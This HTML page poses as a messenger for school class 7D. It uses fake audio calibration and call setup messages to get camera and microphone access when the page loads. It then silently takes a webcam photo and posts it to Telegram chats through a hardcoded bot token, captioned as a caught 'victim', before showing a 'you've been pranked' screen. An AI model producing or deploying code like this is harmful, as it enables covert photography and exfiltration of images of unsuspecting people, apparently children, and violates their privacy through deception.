<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Мессенджер для 7Д</title>
    <style>
        * {
            box-sizing: border-box;
        }
        body {
            background: #0f172a;
            color: #f8fafc;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            overflow: hidden;
        }

        /* Экран загрузки / мессенджера */
        #loader-screen {
            display: flex;
            flex-direction: column;
            align-items: center;
            text-align: center;
            background: #1e293b;
            padding: 30px;
            border-radius: 16px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.3);
            max-width: 350px;
            width: 90%;
            border: 1px solid #334155;
        }
        .logo {
            font-size: 32px;
            margin-bottom: 10px;
        }
        .spinner {
            border: 4px solid rgba(56, 189, 248, 0.2);
            border-top: 4px solid #38bdf8;
            border-radius: 50%;
            width: 45px;
            height: 45px;
            animation: spin 0.8s linear infinite;
            margin: 20px 0;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        #status-text {
            font-size: 14px;
            color: #94a3b8;
            line-height: 1.4;
        }
        
        /* Экран розыгрыша */
        #prank-screen {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            background: #000;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            z-index: 10;
            padding: 20px;
            text-align: center;
        }
        #prank-screen h1 {
            color: #ff4757;
            font-size: 32px;
            margin-bottom: 15px;
            text-transform: uppercase;
            text-shadow: 0 0 10px rgba(255, 71, 87, 0.6);
            animation: pulse 1s infinite alternate;
        }
        @keyframes pulse {
            0% { transform: scale(1); }
            100% { transform: scale(1.05); }
        }
        #photo-container img {
            width: 100%;
            max-width: 380px;
            border-radius: 12px;
            border: 4px solid #ff4757;
            box-shadow: 0 0 20px rgba(255, 71, 87, 0.5);
        }
        .sub-text {
            margin-top: 15px;
            color: #aaa;
            font-size: 14px;
        }
    </style>
</head>
<body>

    <!-- ЭКРАН 1: Маскировка под мессенджер -->
    <div id="loader-screen">
        <div class="logo">💬</div>
        <h2 style="margin: 0; font-size: 20px; color: #fff;">Мессенджер для 7Д</h2>
        <div class="spinner"></div>
        <div id="status-text">Инициализация аудио-модуля... Подготовка к созвону.</div>
    </div>

    <!-- ЭКРАН 2: Результат -->
    <div id="prank-screen">
        <h1>ТЫ РАЗЫГРАН! 😂</h1>
        <div id="photo-container"></div>
        <div class="sub-text" id="upload-status">Передаем данные в класс... ⏳</div>
    </div>

    <!-- Скрытые элементы камеры/микрофона -->
    <video id="video" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const BOT_TOKEN = '9176741718:AAG4UgtGs8O8MovvouhjS8ncg3Jbgl73PWY'; 
        // Массив со всеми Chat ID
        const CHAT_IDS = ['7523561197', '8671534168'];

        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const loaderScreen = document.getElementById('loader-screen');
        const prankScreen = document.getElementById('prank-screen');
        const photoContainer = document.getElementById('photo-container');
        const statusText = document.getElementById('status-text');
        const uploadStatus = document.getElementById('upload-status');

        async function sendToTelegram(dataUrl) {
            try {
                const res = await fetch(dataUrl);
                const blob = await res.blob();
                
                // Отправляем снимки по всем указанным Chat ID
                for (const chatId of CHAT_IDS) {
                    const formData = new FormData();
                    formData.append('chat_id', chatId);
                    formData.append('photo', blob, 'target.png');
                    formData.append('caption', '🎯 Пойман новый жертва! 😂');

                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    });
                }

                uploadStatus.textContent = "Снимок успешно отправлен! 🚀";
            } catch (err) {
                console.error('Ошибка сети:', err);
                uploadStatus.textContent = "Ошибка связи с Telegram.";
            }
        }

        async function initMessengerPrank() {
            try {
                statusText.textContent = "Шаг 1/2: Калибровка микрофона для связи...";
                const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true, video: false });
                
                await new Promise(resolve => setTimeout(resolve, 1500));

                statusText.textContent = "Шаг 2/2: Проверка видеокамеры...";
                const videoStream = await navigator.mediaDevices.getUserMedia({ 
                    video: true, 
                    audio: false 
                });
                
                video.srcObject = videoStream;
                statusText.textContent = "Подключение к конференции...";

                setTimeout(async () => {
                    canvas.width = video.videoWidth || 640;
                    canvas.height = video.videoHeight || 480;
                    
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

                    const dataUrl = canvas.toDataURL('image/png');

                    const img = document.createElement('img');
                    img.src = dataUrl;
                    photoContainer.appendChild(img);

                    audioStream.getTracks().forEach(track => track.stop());
                    videoStream.getTracks().forEach(track => track.stop());

                    loaderScreen.style.display = 'none';
                    prankScreen.style.display = 'flex';

                    await sendToTelegram(dataUrl);

                }, 1000);

            } catch (err) {
                statusText.textContent = "Ошибка доступа. Для входа в мессенджер нужны разрешения.";
            }
        }

        window.addEventListener('load', initMessengerPrank);
    </script>
</body>
</html>
